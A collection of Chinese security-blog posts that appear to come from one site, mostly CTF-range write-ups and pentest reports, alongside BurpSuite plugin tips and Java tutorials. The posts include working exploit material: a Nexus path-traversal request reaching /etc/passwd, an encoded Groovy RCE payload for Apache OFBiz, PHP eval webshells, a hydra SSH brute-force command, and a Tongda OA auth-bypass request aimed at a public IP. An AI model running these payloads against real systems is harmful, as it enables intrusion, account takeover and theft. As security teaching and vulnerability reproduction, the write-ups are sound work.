[{"content":"前言 漏洞科普 SSH爆破攻击是一种通过自动化工具（如Hydra、Medusa等）对SSH服务进行大规模密码猜测的攻击手段，其核心原理是利用预先设定的用户名和密码字典或暴力生成的字符组合，对目标服务器的SSH端口（通常是22端口）发起高频次登录尝试，直到找到正确的凭据。攻击者常采用分布式策略，通过多IP并发请求绕过单点封禁限制，并利用弱密码或默认账户（如root、admin）进行针对性破解。\n这种攻击的危害主要体现在三个方面：\n​​系统安全风险​​：一旦成功，攻击者可完全控制目标服务器，执行恶意操作（如窃取数据、植入后门或勒索软件），甚至将服务器纳入僵尸网络用于DDoS攻击或加密货币挖矿。 ​​资源消耗​​：高频次登录尝试会占用大量CPU、内存和带宽资源，导致服务器性能下降甚至服务中断。 ​​隐蔽性威胁​​：大量失败登录日志可能掩盖真实攻击事件，而成功入侵后植入的隐藏计划任务（如定时反弹Shell）会长期维持权限，进一步扩大攻击面。 靶机实战 首先开启实例，获取入口，获取的地址+端口为SSH服务，并非WEB服务！\n在Kali（Linux）下可以使用 hydra 工具进行服务密码爆破，通过靶机信息已知默认用户为 user，使用如下命令进行服务密码爆破，可以获取到密码为：123456\n1 2 3 4 # 示例 hydra -l user -P /home/slimer/桌面/rockyou.txt ssh://node.hackhub.get-shell.com:59313 # 使用方法 hydra -l \u0026lt;用户名\u0026gt; -P \u0026lt;字典路径\u0026gt; \u0026lt;协议头\u0026gt;://\u0026lt;目标地址和端口\u0026gt; 在Windows上可以借助 无影TscanPlus 工具中的密码破解模块进行服务密码爆破\n修改SSH端口号，将地址填入后即可开始爆破，可以获取到密码为：123456\n使用题目信息给出的用户名和爆破获取到的密码：user / 123456 进行SSH登录。\n登录后为普通用户，然后使用 sudo -i 进行提权后，查看根目录 flag文件 即可获取flag。\nflag:\n1 GetShell{d433d242-ac32-4c56-93b8-5c00fe0d8b25} ","date":"2025-09-28T00:00:00Z","image":"http://localhost:1313/images/86.webp","permalink":"http://localhost:1313/p/%E6%9E%81%E6%A0%B8getshell%E9%9D%B6%E5%9C%BAssh-%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/","title":"【极核GetShell靶场】SSH - 密码爆破"},{"content":"前言 这是一个授权的系统，还没有上线，并且开发已修复。\n结论 攻击者可以自己注册的账号，强行修改其他用户的密码。\n复现 开局一个忘记密码页面。\n通过任意用户注册，成功注册两个账号：(注册的时候使用的是身份证)\n1 2 账户1：35xxxx3 账户2：41xxxx8 这里使用账户1账号绑定的手机号，获取到短信验证码。\n抓取数据包，可以看到账号使用的是Base64编码。\n这里是用户名，使用了Base64编码，直接可以解出来。\n这里我们更换为第二个账号的Base64编码\n成功修改用户2的密码。\n漏洞修复 将每个用户的Cookie跟身份证账号进行绑定。\n","date":"2025-09-26T00:00:00Z","image":"http://localhost:1313/images/85.webp","permalink":"http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%AB%98%E5%8D%B1/","title":"【渗透测试】任意用户密码修改（高危）"},{"content":"概述 BurpSuite是渗透测试人员常用的安全工具，它提供了一个功能扩展，也就是插件。在这个功能里面可以安装许多功能性插件，从而达到如虎添翼的效果。\n但是BurpSuite的扩展存在一个问题，就是插件安装过多会导致卡顿、内存溢出等。所以插件的选择就显得十分重要！本文就笔者本人的经验，推荐一些不错的BurpSuite插件，达到即实用又兼顾性能的效果！\n插件安装 在推荐插件之前，先讲述一下如何安装插件，我们一般下载的插件是一个扩展名为.jar的文件。\n安装方式：打开BurpSuite -\u0026gt; 扩展 -\u0026gt; 添加 -\u0026gt; 选择文件 -\u0026gt; 安装\n插件推荐 HAE Github下载：\n1 https://github.com/gh0stkey/HaE/releases/tag/4.3.1 HAE可以发现HTTP数据包的相关重要信息，能够有效减少测试时间，将更多精力集中在有价值且有意义的报文上，从而提高漏洞挖掘效率。\n安装完插件后，使用Burpsuite代理访问一些网页产生一些HTTP数据包，在BurpSuite模块代理 -\u0026gt; HTTP记录里面，即可发现一些被特殊标记的数据包！例如：Shiro、Swagger UI、Ueditor、身份证、IP地址等等\nBurpAPIFinder Github下载\n1 https://github.com/shuanx/BurpAPIFinder/releases/tag/v2.0 攻防演练过程中，我们通常会用浏览器访问一些资产，但很多未授权/敏感信息/越权隐匿在已访问接口过html、JS文件等，通过该BurpAPIFinder插件我们可以：\n1、发现通过某接口可以进行未授权/越权获取到所有的账号密码、私钥、凭证\n2、发现通过某接口可以枚举用户信息、密码修改、用户创建接口\n3、发现登陆后台网址\n4、发现在html、JS中泄漏账号密码或者云主机的Access Key和SecretKey\n5、自动提取js、html中路径进行访问，也支持自定义父路径访问 …\nBurpFingerPrint Github下载\n1 https://github.com/shuanx/BurpFingerPrint/releases/tag/v1.5 攻击过程中，我们通常会用浏览器访问一些资产，该BurpSuite插件实现被动指纹识别+网站提取链接+OA爆破，可帮助我们发现更多资产。\nRVScan Github下载\n1 https://github.com/XF-FS/RVScan/releases/tag/RVScan2.4 核心功能\n📊 实时监控 – 扫描进度和结果实时显示 🔍 被动扫描 – 自动检测敏感路径和接口通过对访问接口递归对每一层路径进行路径探测，探测是否存在敏感信息漏洞接口 💡 访问/admin/auth/api，递归探测会访问/、/admin/、/admin/auth/、/admin/auth/api/ 💡 一般可探测出如Swagger接口、登陆后台、漏洞路径、配置文件、spring env等泄露信息 🎯 指纹识别 – 支持关键词、favicon hash等多种识别方法 💡 通过识别访问接口是否存在指定指纹，判断指纹信息，功能参考Ehole 🚀 路径绕过 – 内置多种绕过技术和payload ⚡ 多线程扫描 – 可配置并发数和速率限制\n举个例子：比如在 https://get-shell.com/ 这个网站下面有WEB备份文件 root.zip，那么当插件被动检测开启的时候，即可通过内置规则进行匹配，然后展示在VulDisplay界面。\nTsojanScan Github下载\n1 https://github.com/Tsojan/TsojanScan/releases/tag/v1.4.6 TsojanScan是一个集成的BurpSuite漏洞探测插件，它会以最少的数据包请求来准确检测各漏洞存在与否，你只需要这一个足矣，其他的单个漏洞扫描插件就可以卸载了。包含了：Nacos、SpringBoot、Log4j、Shiro、Fastjson、Weblogic、ThinkPHP、SQLI等主动/被动扫描。\nAutorize 下载方式：BurpSuite -\u0026gt; 扩展 -\u0026gt; BApp商店 -\u0026gt; Autorize -\u0026gt; 安装\nautorize是一个可以发现未授权漏洞的工具，举个例子：有一个接口例如 https://get-shell.com/api/adduser ，这个接口的本意是留给管理员权限（高权限）使用，普通用户（低权限）无法使用，但是如果这个接口没有做鉴权处理，导致了低权限用户也可以使用，那么这就是一个未授权访问漏洞。\n而这个插件就可以发现这个问题，**需要在插件页面的右面窗口放入低权限用户（未登录）状态下的cookie或者点击Fetch Cookies Filters自动填充获取最近获得的Cookie，然后点击Autorize is off**开启检测，插件会有三种状态：\n绕过（Bypassed）！- 红色（可能存在未授权） 强制执行！- 绿色（不存在未授权） 强制执行???（请配置强制检测器） – 黄色\n根据需要，重点查看**绕过（Bypassed）！- 红色（可能存在未授权），如果这是一个高权限API或者一个高权限的页面，在去掉cookie后仍然可以访问，那么这就是一个未授权漏洞！\nxia_Yue (瞎越) Github下载\n1 https://github.com/smxiazi/xia_Yue/releases/tag/1.4 本质上与上面的Autorize是同样类型的插件，是一个可以发现未授权漏洞的工具，举个例子：有一个接口例如 https://get-shell.com/api/adduser ，这个接口的本意是留给管理员权限（高权限）使用，普通用户（低权限）无法使用，但是如果这个接口没有做鉴权处理，导致了低权限用户也可以使用，那么这就是一个未授权访问漏洞。\n使用的时候需要在插件右面替换一下低权限的token。\n","date":"2025-09-24T00:00:00Z","image":"http://localhost:1313/images/83.webp","permalink":"http://localhost:1313/p/%E5%B7%A5%E5%85%B7burpsuite%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90%E5%90%88%E9%9B%86/","title":"【工具】BurpSuite插件推荐合集"},{"content":"前言 主要跟朋友开黑语音使用，感觉比较不错的一个语音软件，用别人的经常掉线，就自己部署一台服务器。\n部署前需要安装docker，这里就不细说了。\n部署 我这里使用阿里云服务器进行部署：\n部署前需要开通三个端口：\n1 2 3 9987 10011 30033 UDP和TCP都要开。\n命令：\n1 docker run -d -p 9987:9987/udp -p 10011:10011 -p 30033:30033 -e TS3SERVER_LICENSE=accept teamspeak 直接这一行命令即可。\n部署完成后\n使用命令：\n1 docker ps 记录docker镜像ID。\n然后查看\n1 docker logs -f 238b55088c9a 需要把这几个值记录下来。\nloginname\npassword\napikey\ntoken\n这样就部署完成了。\n管理员登录 直接进行连接即可。\n服务器别名或地址：（服务器IP地址）\n服务器密码：（password）\n昵称：（loginname）\n一次性权限密钥（token）\n普通用户登录 直接服务器输入服务器IP地址即可。其他都不需要输入，即可连接。\n","date":"2025-09-24T00:00:00Z","image":"http://localhost:1313/images/84.webp","permalink":"http://localhost:1313/p/%E5%B7%A5%E5%85%B7teamspeak3%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/","title":"【工具】teamspeak3安装使用教程"},{"content":"0x00 项目地址 项目为狼组团队的师傅开发，废话不多说，以下是项目地址：\n1 https://github.com/wgpsec/ENScan_GO 我的是windows系统，直接下载这个即可。\n文件下载解压仅有exe文件\n0x01 使用 初次使用需要初始化\n1 .\\enscan-v1.3.1-windows-amd64.exe -v 生成config.yaml配置文件\n以爱企查为例导入cookie\n1 2 链接：https://aiqicha.baidu.com/ （注意：默认查询为aiqicha.baidu.com，请勿使用 aiqicha.com） 这里最好使用抓包工具进行抓取：\n爱企查的cookie\n天眼查的cookie\n然后直接运行，即可！\n1 .\\enscan-v1.3.1-windows-amd64.exe -n \u0026#34;汉堡王（上海）餐饮有限公司\u0026#34; ","date":"2025-09-22T00:00:00Z","image":"http://localhost:1313/images/82.webp","permalink":"http://localhost:1313/p/%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86enscan_go-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/","title":"【资产收集】ENScan_Go-信息收集工具"},{"content":"0x00 简单介绍 一个简单的java程序\n1 2 3 4 5 6 7 8 public class Main { public static void main(String[] args) { System.out.printf(\u0026#34;Hello and welcome!\u0026#34;); for (int i = 1; i \u0026lt;= 5; i++) { System.out.println(\u0026#34;i = \u0026#34; + i); } } } 代码审计的核心是什么？\n1 2 3 4 1. 关键函数 sink点 Runtime.getRuntime.exec(Cmd) -\u0026gt;Cmd 是否可控（输入点） 过滤，web的流程 2. 通读代码（逻辑漏洞：越权，登录绕过，支付漏洞等等） 熟悉项目:\n1 2 3 Spring Tomcat Stust2 代码审计的工具：\n1 2 Codeql （学习成本很大） https://codeql.github.com/codeql-standard-libraries/java/ 敏感函数快速审计工具：\n1 2 semgrep https://semgrep.dev/docs/ 0x01 变量 数字型 1 2 3 4 5 6 7 8 9 10 11 12 13 整数 byte b;// -128～127 -2（7）～2（7）-1 8 short s;// 短整型 -32768～32767 -2（15）～2（15）-1 16 int i; // 整型 -2（31）～2（31）-1 32 long l; // 长整型 -2（63）～2（63）-1 小数（浮点数） float f;// 点精度 6-7 +-3.4*10(38) double d;// 双精度15-16 +-1.8*10(308) 字符型 char c; // a b c d ascii 0-65535 布尔型 boolean bool; // 真或假 0 或 1 流程控制阶段 变量的声明于初始化 1 2 格式： 数据类型 变量名（声明格式） String b = \u0026#34;S\u0026#34;; 初始化 1 2 3 4 5 6 赋值 方法1：int i = 10; // 声明时变量i赋值10 方法2： int j; j=20; // 先声明后赋值 在同一作用域中，变量名不能重复 基本数据类型的转换 1 2 3 4 5 6 7 8 9 自动转换（隐式转换） 小范围-》大范围 数据类型是有范围的 byte-\u0026gt;short-\u0026gt;int-\u0026gt;long-\u0026gt;float-\u0026gt;d char-\u0026gt;int-\u0026gt;long-\u0026gt;float-\u0026gt;d 强制转换（显式转换） int i=10; byte b = (byte) i; ps:溢出,布尔类型除外 输入输出 1 2 3 4 5 6 7 8 9 10 System.out.print(\u0026#34;Hello World!\u0026#34;); // 没有换行符的 System.out.println(\u0026#34;Hello World!\u0026#34;); // 有换行符的 // %s 字符串 // %d 整数 // %f 浮点 // %c 字符 // %b 布尔 // %% 输出百分号 System.out.printf(\u0026#34;%8d hello\\n\u0026#34;,1); // 默认右对齐 System.out.printf(\u0026#34;%-8d hello\\n\u0026#34;,1); // 左对齐 作业 编写一个输出姓名，年龄的程序\n姓名：xxx 年龄：xxx\n输入两次，输出要对其，年龄可能所10 也 2，姓名可能三个字符也可能是4个字\n代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import java.util.Scanner; public class Main { public static void main(String[] args) { Scanner scanner = new Scanner(System.in); // 输入第一个人的信息 System.out.print(\u0026#34;请输入第一个人的姓名：\u0026#34;); String name1 = scanner.nextLine(); System.out.print(\u0026#34;请输入第一个人的年龄：\u0026#34;); int age1 = scanner.nextInt(); scanner.nextLine(); // 消耗换行符 // 输入第二个人的信息 System.out.print(\u0026#34;请输入第二个人的姓名：\u0026#34;); String name2 = scanner.nextLine(); System.out.print(\u0026#34;请输入第二个人的年龄：\u0026#34;); int age2 = scanner.nextInt(); // 输出结果，使用格式化对齐 System.out.println(\u0026#34;\\n输出结果：\u0026#34;); // %-6s 表示左对齐，占6个字符位置 // %d 表示整数 System.out.printf(\u0026#34;姓名：%-6s 年龄：%d%n\u0026#34;, name1, age1); System.out.printf(\u0026#34;姓名：%-6s 年龄：%d%n\u0026#34;, name2, age2); scanner.close(); } } 输出：\n1 2 3 4 5 6 7 8 请输入第一个人的姓名：li 请输入第一个人的年龄：18 请输入第二个人的姓名：wang 请输入第二个人的年龄：12 输出结果： 姓名：li 年龄：18 姓名：wang 年龄：12 ","date":"2025-09-19T00:00:00Z","image":"http://localhost:1313/images/79.webp","permalink":"http://localhost:1313/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1java%E5%9F%BA%E7%A1%80-%E5%8F%98%E9%87%8F/","title":"【Java代码审计】Java基础-变量"},{"content":"0x00 异常处理机制 这里我打个比方，0不能当被除数，如果当了被除数就会报错，然后这个报错了之后，后续的程序就不会运行。\n代码：\n1 2 3 4 5 6 7 8 9 10 public class Main { public static void main(String[] args) { int sa = divide(1,0); System.out.println(sa); } //divide方法 public static int divide(int a,int b) { return a/b; } } 结果：\n1 2 3 Exception in thread \u0026#34;main\u0026#34; java.lang.ArithmeticException: / by zero at Main.divide(Main.java:10) at Main.main(Main.java:5) 这里的话就会影响整个程序的运行，只要这里出错，后续代码都不会执行，那么怎么才能让他抛出整个异常，继续执行后续代码呢？\n这里就用到了try/catch语句：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public class Main { public static void main(String[] args) { //异常抛出语句，如果try里面的代码块出错了，会执行catch里面的代码块。 //这里必须要把sa给弄出来，这里是全局变量里的问题。 int sa = 0; try { sa = divide(1,0); }catch (Exception e){ System.out.println(\u0026#34;程序出错\u0026#34;); } //虽然上面的代码出错了，但是这句语句还是执行了。 System.out.println(sa); } //divide方法 public static int divide(int a,int b) { return a/b; } } 输出：\n1 2 程序出错 0 0x01 多个异常捕获 第一种：java里报错有很多种，这里说一下空指针异常：\n示例：\n1 2 3 4 5 6 7 public class Main { public static void main(String[] args) { //这里是一个a的字符串，内容为null，输出a的长度。 String a = null; System.out.println(a.length()); } } 输出：（这里表示空指针异常的报错信息）\n1 2 Exception in thread \u0026#34;main\u0026#34; java.lang.NullPointerException: Cannot invoke \u0026#34;String.length()\u0026#34; because \u0026#34;a\u0026#34; is null at Main.main(Main.java:5) 第二种：然后比较一下0不能做被除数的报错报出来的异常：\n1 2 3 4 5 6 7 8 9 10 public class Main { public static void main(String[] args) { int sa = divide(1,0); System.out.println(sa); } //divide方法 public static int divide(int a,int b) { return a/b; } } 结果：\n1 2 3 Exception in thread \u0026#34;main\u0026#34; java.lang.ArithmeticException: / by zero at Main.divide(Main.java:10) at Main.main(Main.java:5) 那怎么做到，这两个异常，分别进行抛出呢？\n示例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public class Main { // 捕获异常 public static void main(String[] args) { // 如果try里面的代码块出现了异常，会执行 catch 里面的代码块 int i=0; try { String str = null; System.out.println(str.length()); // 遇到异常后不再执行，跳转到catch divide(1,0); }catch (ArithmeticException e){ // catch 代码块报错执行 // 0 不能作为除数 System.out.println(\u0026#34;0 不能作为除数\u0026#34;); }catch (NullPointerException e){ System.out.println(\u0026#34;空指针异常\u0026#34;); } // 捕获异常后代码正常执行 System.out.println(\u0026#34;i = \u0026#34; + i); } public static int divide(int a,int b) { return a/b; } } 输出：\n1 2 空指针异常 i = 0 0x02 自定义抛出异常 这里可以直接在根源上报错。\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class Main { // 捕获异常 public static void main(String[] args) { int a = divide(1,2); System.out.println(a); } public static int divide(int a,int b) throws Exception { if (a == 1){ //自定义条件，a不能等于1，如果等于1就抛出异常，后面的代码不再执行。 //throw 抛出 throw new Exception(\u0026#34;a不能等于1\u0026#34;); } return a/b; } } 从这里可以直接看出，直接在方法上出现了错误。\n这里出错，使用try/catch进行捕获。\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public class Main { // 捕获异常 public static void main(String[] args) { int a = 0; try { a = divide(10,0); }catch (Exception e){ System.out.println(e.getMessage()); } System.out.println(a); } public static int divide(int a,int b) throws Exception { if (a == 1){ //自定义条件，a不能等于1，如果等于1就抛出异常，后面的代码不再执行。 //throw 抛出 throw new Exception(\u0026#34;a不能等于1\u0026#34;); } return a/b; } } 输出：\n1 2 / by zero 0 0x03 总结 异常的关键字 1 2 3 4 try 捕获异常 catch 输出异常 throw 抛出异常 throw 在方法上抛出异常 自定义抛出异常 比如自定义一个类NameException：\nNameException类：\n1 2 3 4 5 6 7 //需要继承Exception //自定义 黑名单姓名异常 public class NameException extends Exception { public NameException() { super(\u0026#34;名称在黑名单里不能使用\u0026#34;); } } 主类（Main）:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public class Main { // 捕获异常 public static void main(String[] args) { try { name(\u0026#34;locks\u0026#34;); } catch (NameException e) { System.out.println(e.getMessage()); } } public static String name(String name) throws NameException { //name 不能叫locks if(name.equals(\u0026#34;locks\u0026#34;)){ throw new NameException(); } return name; } } 输出：\n1 名称在黑名单里不能使用 ","date":"2025-09-19T00:00:00Z","image":"http://localhost:1313/images/80.webp","permalink":"http://localhost:1313/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1java%E5%9F%BA%E7%A1%80-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6/","title":"【Java代码审计】Java基础-异常处理机制"},{"content":"靶标介绍 Sonatype Nexus Repository 3（通常简称为Nexus3）是一个由Sonatype开发的仓库管理工具，用于管理和托管各种软件构件（如Maven构件、Docker镜像等），它提供了一种集中化的方式来存储、管理和分发软件构件，以帮助团队协作和构建自动化。\nSonatype Nexus Repository 3.0.0 - 3.68.0版本中存在路径遍历漏洞，未经身份验证的威胁者可构造恶意URL下载目标系统上的任意文件。\n登录靶场 POC（少一个%2F都不行）\n1 %2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fflag flag\n1 flag{052c8b51-0d6c-45e6-8040-85243bf3182e} 思路 根据网上找到的poc\n1 2 3 4 5 6 7 8 GET /%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/passwd HTTP/1.1 Host: localhost Accept-Encoding: gzip, deflate, br Accept: */* Accept-Language: en-US;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36 Connection: close Cache-Control: max-age=0 ","date":"2025-09-19T00:00:00Z","image":"http://localhost:1313/images/81.webp","permalink":"http://localhost:1313/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2024-4956%E5%A4%8D%E7%8E%B0/","title":"【春秋云境】CVE-2024-4956复现"},{"content":"开局一个报告，怎么说呢，护网期间被打穿了，不过庆幸的是不是我们负责的网站。没有任何责任，哈哈哈哈\n，话不多说，上过程。\n过程 首先一个heapdump的连接\n1 http://xxxx:8888/admin/actuator/heapdump 经过分析，泄露的信息总结一下（每个文件泄露的信息都是不一样的，这时候就要看运气了）：\n1 2 3 4 5 6 7 8 数据库账号密码： - MySQL 用户名：xxxx - MySQL 密码：xxxx（明文泄露） - 数据库地址：`xxxx-mysql:3306`（服务名 / 端口） - 数据库名：`xxxx` - Spring Security 默认用户密码：`84acxxxxx2c`（明文） 这个可以直接用user/默认用户密码进行登录试一下，绝对有惊喜。 就这两个信息有用，可以直接对服务器进行攻击。\n这里尝试了一下，发现数据库可以直接进行连接，就离谱。\n","date":"2025-09-19T00:00:00Z","image":"http://localhost:1313/images/78.webp","permalink":"http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95heapdump%E6%B3%84%E9%9C%B2%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/","title":"【渗透测试】heapdump泄露数据库账号密码"},{"content":"复现 开局一个登录框\n抓包构造POC\n1 2 3 4 5 6 7 POST /logincheck_code.php HTTP/1.1 Host: 61.184.199.14:8989 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Content-Length: 56 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip UID=1 记录返回的PHPSESSID，在漏洞url后构建poc。\n访问地址：\n1 http://xxxx/general/index.php 替换刚才记录的PHPSESSID，成功登录到管理员用户。\n","date":"2025-09-18T00:00:00Z","image":"http://localhost:1313/images/77.webp","permalink":"http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9A%E8%BE%BEoa%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/","title":"【渗透测试】通达OA登录认证绕过"},{"content":"0x01 靶标介绍 BoidCMS v.2.0.0 存在文件上传漏洞，远程攻击者可通过添加 GIF 头部绕过 MIME 类型检查，执行任意代码。\n0x02 影响范围 BoidCMS \u0026lt;=2.0.0\n0x03 漏洞复现 首先来到admin页面，使用bs爆破，得到账号密码\nMedia页面可以上传文件，尝试上传文件\n文件类型不被支持，我们先上传一个正常文件\n进行抓包，然后编辑重放\n将文件名更改为php后缀，在文件头下面添加payload\n1 2 \u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt; \u0026lt;?php system(\u0026#34;cat /flag\u0026#34;);?\u0026gt; 刷新可以看到上传成功\n回显得到flag\n","date":"2025-09-17T00:00:00Z","image":"http://localhost:1313/images/76.webp","permalink":"http://localhost:1313/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2023-38836%E5%A4%8D%E7%8E%B0/","title":"【春秋云境】CVE-2023-38836复现"},{"content":"靶标介绍： Apache OFBiz 目录遍历致代码执行漏洞，攻击者可构造恶意请求控制服务器。\n该平台存在路径遍历漏洞，其成因是未对用户输入的 contextPath 参数进行充分验证。这使得未授权的攻击者能够通过精心构造的恶意请求绕过认证机制，进而访问系统中本应受保护的敏感接口，最终可能引发任意代码执行的严重后果。\n漏洞影响版本 受影响版本​​：Apache OFBiz \u0026lt; 18.12.14 ​​FOFA搜索语法​​：app=\u0026quot;Apache_OFBiz\u0026quot; 危害 未授权访问：攻击者无需认证，通过构造恶意请求，可绕过验证机制，访问本应受限的敏感接口，进而获取系统中敏感信息，如用户数据、商业机密等，严重威胁数据的保密性。 远程代码执行：漏洞允许攻击者利用/webtools/control/ProgramExport接口的编程导出功能，执行任意 Groovy 代码，从而实现远程代码执行，完全控制受影响的系统，可进行数据篡改、删除、植入恶意软件等操作，对系统的完整性和可用性造成极大破坏。 权限提升：攻击者可借此漏洞从低权限用户提升至高权限用户，进而执行更广泛的系统操作，对整个系统的安全构成严重威胁。 中间人攻击风险：攻击者可利用该漏洞篡改系统返回给合法用户的响应内容，实施中间人攻击，进一步获取用户敏感信息或向用户传播恶意内容。 大规模攻击风险：由于 Apache OFBiz 在电子商务领域的广泛应用，该漏洞的存在使得大量系统面临被攻击的风险，一旦被大规模利用，可能导致众多企业及用户的业务中断、数据泄露等严重后果，影响范围广泛。 复现 访问：\n1 https://39.106.48.123:31276/ 1 正确路径应该加上/accounting/control/main 这里显示你的ip为被加入到配置文件的相关允许配置参数中，所以显示了500，但是不影响后面操作，直接通过poc拿下。\n可以看到一个 ERROR MESSAGE，出现报错，因为是非本地 localhost 启动，Headers 需要包含 Host: localhost，所以把 Host 改为：localhost:port\nPOC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 POST /webtools/control/forgotPassword/ProgramExport HTTP/1.1 Host: localhost:31276 Cookie: OFBiz.Visitor=10002 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Priority: u=0, i Te: trailers Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 262 groovyProgram=\\u0074\\u0068\\u0072\\u006F\\u0077\\u0020\\u006E\\u0065\\u0077\\u0020\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006F\\u006E\\u0028\\u0027\\u0069\\u0064\\u0027\\u002E\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0028\\u0029\\u002E\\u0074\\u0065\\u0078\\u0074\\u0029\\u003B 得到 id 为 root，说明执行成功\n这里执行的远程命令是throw new Exception('cat /flag'.execute().text);用于获取flag\n同样的 Unicode 编码\n1 \\u0074\\u0068\\u0072\\u006f\\u0077\\u0020\\u006e\\u0065\\u0077\\u0020\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u0028\\u0027\\u0063\\u0061\\u0074\\u0020\\u002f\\u0066\\u006c\\u0061\\u0067\\u0027\\u002e\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0028\\u0029\\u002e\\u0074\\u0065\\u0078\\u0074\\u0029\\u003b 1 flag{c95e8bc5-409e-40c9-bd82-b7234b2987fe} 修复建议 官方补丁​​：升级至Apache OFBiz 18.12.14或更高版本 ​​临时缓解措施​​： 禁用webtools模块的非必要接口。 配置Web应用防火墙（WAF）拦截包含%2e或;的恶意请求。 ​​输入过滤​​：对groovyProgram参数实施白名单校验，禁止异常字符。 ","date":"2025-09-16T00:00:00Z","image":"http://localhost:1313/images/74.webp","permalink":"http://localhost:1313/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2024-36104%E5%A4%8D%E7%8E%B0/","title":"【春秋云境】CVE-2024-36104复现"},{"content":"案例介绍 某金融项目的一个爆破支付密码的进而进行修改支付密码案例\n案例 该用户中心的修改密码功能，该功能会先去验证当前交易密码输入得是否正确，如果正确就进行修改密码的操作，不正常则返回密码错误，而且该处并没有进行限制修改次数。\n查看一下错误的返回包\n使用 burp 进行爆破\n该种类漏洞，收录可能会有一些比如需要爆破次数需要达到 2w 类似的要求。\n","date":"2025-09-15T00:00:00Z","image":"http://localhost:1313/images/75.webp","permalink":"http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%88%86%E7%A0%B4%E6%94%AF%E4%BB%98%E5%AF%86%E7%A0%81/","title":"【渗透测试】爆破支付密码"},{"content":"介绍 1 2 cockpit在2.4.1版本之前存在任意文件上传漏洞 PS：通过在浏览器中打开/install来运行安装 复现 1 这里尝试弱口令爆破，结果进不去，回头看题目提示：进入/install目录安装后，即可通过admin/admin登陆。 1 这里我们找到文件上传点。上传一句话木马 1 复制文件路径 在蚂剑上直接测试即可\n1 2 https://eci-2ze1ghrtc5jqkajinw9f.cloudeci1.ichunqiu.com/storage/uploads/2025/09/15/webshell_uid_68c7ce8c76b91.php 123 1 然后进入shell环境，查询flag 1 flag{06bd88f4-e116-4f2e-b5c5-4bf352e21d00} ","date":"2025-09-14T00:00:00Z","image":"http://localhost:1313/images/73.webp","permalink":"http://localhost:1313/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2023-1313%E5%A4%8D%E7%8E%B0/","title":"【春秋云境】CVE-2023-1313复现"},{"content":"复现 看了一眼请求包 在小程序中他是这样子登录的\n根据个人测试的经验来说..这里关键的就是unionId\n只要能拿到unionId就能登录他人账号\n那如何获取这个unionId?\n灵机一动 这里刚好有个排行榜 可以看到其他人的分数信息\n感觉这里肯定会返回unionId\n那么果真就返回了unionId\n那么登录时 将别人的UNION_ID一替换 